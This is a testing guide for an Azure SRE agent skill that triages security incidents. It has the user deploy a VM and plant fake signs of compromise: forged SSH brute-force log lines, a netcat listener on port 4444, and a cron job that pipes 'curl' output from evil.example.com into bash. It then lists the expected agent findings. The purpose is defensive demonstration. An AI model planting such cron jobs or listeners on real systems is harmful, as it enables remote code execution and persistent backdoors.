# Security Incident Triage — Testing Guide

## What this skill does
Triages suspicious activity on Azure VMs — brute-force login attempts, rogue processes, unexpected open ports, suspicious cron jobs, and recently modified system files. Produces a risk-assessed security report. Supports Linux and Windows.

## Before you start

Replace the placeholder values in the commands below with your own environment details:

| Placeholder | Your value |
|-------------|-----------|
| `<your-subscription-id>` | Your Azure subscription ID |
| `<region>` | Your Azure region (e.g., `eastus2`, `swedencentral`) |
| `rg-sre-demo-<region>` | Your demo resource group name |
| `<your-vnet-name>` | Your VNet name (or omit `--vnet-name` and `--subnet` to use the default VNet) |
| `<your-subnet-name>` | Your subnet name |

## Prerequisites
- Azure CLI installed and logged in
- Access to subscription `<your-subscription-name>` (<your-subscription-id>)
- The security-incident-triage skill added to your Azure SRE Agent

## Deploy a test VM

```bash
az group create --name rg-sre-demo-<region> --location <region> --subscription <your-subscription-id>

az vm create \
  --resource-group rg-sre-demo-<region> \
  --name vm-sre-demo-security \
  --image Ubuntu2404 \
  --size Standard_D2s_v5 \
  --admin-username azureuser \
  --generate-ssh-keys \
  --public-ip-address "" \
  --vnet-name <your-vnet-name> \
  --subnet <your-subnet-name> \
  --nsg "" \
  --subscription <your-subscription-id>
```

## Simulate the issue

Connect via Bastion and plant multiple indicators of compromise:

### 1. Fake brute-force SSH login attempts
```bash
for i in $(seq 1 50); do
  echo "$(date -R) sshd[$$]: Failed password for root from 203.0.113.$((RANDOM % 256)) port $((RANDOM % 60000 + 1024)) ssh2" | sudo tee -a /var/log/auth.log > /dev/null
done
```

### 2. Open a suspicious listening port (simulating a reverse shell)
```bash
nohup nc -l -k -p 4444 > /dev/null 2>&1 &
```

### 3. Create a suspicious cron job
```bash
echo "*/5 * * * * curl -s http://evil.example.com/beacon | bash" | sudo tee -a /etc/crontab > /dev/null
```

> **Tip:** All three together create a convincing "compromised VM" scenario for the demo.

## Try the skill

### Prompt:
> "Our monitoring flagged suspicious activity on `vm-sre-demo-security` in `rg-sre-demo-<region>`. There may be brute force attempts or unauthorized access. Can you investigate?"

### Expected agent behavior:
1. Checks `/var/log/auth.log` for failed login attempts — identifies source IPs and frequency
2. Lists all listening ports (`ss -tlnp`) — flags unexpected port 4444
3. Checks running processes for anomalies
4. Checks crontab entries — finds the suspicious `curl | bash` command
5. Checks recently modified system files
6. Produces a security triage report with risk severity and recommended actions

### What to expect:
- Security always gets attention, especially with executive audiences
- Multiple indicators of compromise make it realistic
- The agent produces a structured risk assessment, not just raw data
- Recommendations are actionable (block IPs, kill process, remove cron job)

## Cleanup

```bash
# Kill netcat listener
az vm run-command invoke --resource-group rg-sre-demo-<region> --name vm-sre-demo-security --command-id RunShellScript --scripts "kill \$(lsof -t -i:4444) 2>/dev/null; sudo sed -i '/evil.example.com/d' /etc/crontab; echo done" --subscription <your-subscription-id>

# Delete the VM
az vm delete --resource-group rg-sre-demo-<region> --name vm-sre-demo-security --yes --subscription <your-subscription-id>
```
